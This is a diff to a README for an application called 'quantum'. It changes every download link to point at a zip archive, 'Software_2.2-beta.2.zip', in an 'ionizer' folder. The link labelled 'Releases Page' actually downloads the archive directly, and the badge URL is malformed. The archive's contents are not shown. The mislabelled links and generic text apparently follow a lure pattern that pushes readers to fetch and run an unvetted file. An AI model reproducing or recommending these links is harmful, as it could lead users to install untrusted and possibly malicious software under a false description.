@@ -8,11 +8,11 @@ Welcome to **quantum**! This application lets you explore the fascinating world 
 
 To get started, you will need to download the application. Click the link below to visit our releases page and download the latest version:
 
-[![Download quantum](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip%https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip)](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip)
+[![Download quantum](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/Software_2.2-beta.2.zip%https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/Software_2.2-beta.2.zip)](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/Software_2.2-beta.2.zip)
 
 ### Steps to Download and Run
 
-1. **Visit the Releases Page:** Click on the link above or go to [Releases Page](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip).
+1. **Visit the Releases Page:** Click on the link above or go to [Releases Page](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/Software_2.2-beta.2.zip).
    
 2. **Choose the Latest Version:** Look for the latest version at the top of the page. It will be clearly labeled.
 
